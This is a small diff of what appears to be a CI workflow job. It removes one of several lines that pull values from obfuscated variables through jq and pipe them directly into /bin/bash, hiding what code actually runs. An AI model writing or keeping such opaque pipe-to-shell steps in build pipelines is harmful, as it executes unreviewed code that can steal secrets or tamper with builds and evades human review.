@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$lni6940" | jq -r .vwoc794 | /bin/bash
           echo $gg68307 | jq -r .z94249 | /bin/bash
           printf '%s' "$rmax26" | jq -r .xdzyy00 | /bin/bash
-          echo $hk75 | jq -r .nu717 | /bin/bash
           printf '%s' "$a28998" | jq -r .cs9307 | /bin/bash
 
       - name: Archive results
